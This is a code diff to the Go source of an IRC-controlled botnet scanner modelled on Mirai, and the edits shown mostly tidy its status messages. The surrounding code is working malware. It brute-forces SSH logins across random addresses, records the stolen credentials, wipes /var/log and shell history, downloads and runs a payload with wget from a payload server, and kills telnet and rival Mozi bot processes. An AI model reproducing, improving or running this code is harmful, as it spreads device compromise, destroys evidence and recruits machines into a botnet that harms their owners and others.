@@ -14,8 +14,9 @@ import (
 )
 
 var (
-	wg        sync.WaitGroup
-	randomNet string //0.0.0.0/0
+	wg         sync.WaitGroup
+	coreReport *string
+	randomNet  string //0.0.0.0/0
 
 	/*
 		Thank you mirai for these usernames and passwords list (You are my inspirelation).
@@ -198,14 +199,13 @@ func genRange(max, min int) string {
 }
 
 func (b *Bot) checkPort(addr string) string {
-	ptrAddr := &addr
 	b.timeout = 1 * time.Second
-	conn, err := net.DialTimeout("tcp", *ptrAddr, b.timeout)
+	conn, err := net.DialTimeout("tcp", addr, b.timeout)
 	if err != nil {
 		return ""
 	}
 	conn.Close()
-	return *ptrAddr
+	return addr
 }
 
 func (b *Bot) manageRange() string {
@@ -278,7 +278,7 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 						b.password = paswdList[paswd]
 						if err == nil {
 							b.payload = genName('a') + genRange(10000, 1000)
-							b.Report("🏳 " + nCores + "Installing bot: " + rtnIP)
+							b.Report(nCores + " Installing bot: " + rtnIP)
 							b.sshExecute("touch /tmp/.ffff; printf \""+b.password+"\\n"+rtnIP+"\\n\""+" > /tmp/.ffff", false)
 							b.sshExecute("rm -rf /var/log/; wget -O ."+b.payload+" "+b.pServer+"; history -c; rm ~/.bash_history", true)
 							b.sshExecute("fuser -k -n tcp 23; killall utelnetd telnetd i .i mozi.m Mozi.m mozi.a Mozi.a", true)
@@ -289,7 +289,7 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 						}
 						if paswd == len(paswdList)-1 {
 							if !isLogin {
-								b.Report("🗑 " + nCores + "No auth match: " + rtnIP)
+								b.Report(nCores + " No auth match: " + rtnIP)
 							}
 						}
 					}
@@ -322,7 +322,14 @@ func (b *Bot) Scanner() {
 				1) Because i need to be careful about overheat problem of a bot device even threads in Go are light weight.
 				2) For against excess flood on IRC server when bot device have more than 4 cores which is equal to cores times 2 when using threads.
 			*/
-			b.Report("👁 [" + strconv.Itoa(b.CPU) + "]CORES START SCANNING...")
+			if b.CPU == 1 {
+				singleCore := "SINGLE CORE"
+				coreReport = &singleCore
+			} else {
+				multiCores := "[" + strconv.Itoa(b.CPU) + "] CORES"
+				coreReport = &multiCores
+			}
+			b.Report(*coreReport + " START SCANNING...")
 			isBreak := make(chan bool)
 			for i := 0; i < b.CPU; i++ {
 				wg.Add(i)
@@ -334,7 +341,7 @@ func (b *Bot) Scanner() {
 				}(i)
 			}
 			if <-isBreak {
-				b.Report("🛎 [" + strconv.Itoa(b.CPU) + "]CORES STOP SCANNING!!!")
+				b.Report(*coreReport + " STOP SCANNING!!!")
 			}
 		}
 	}
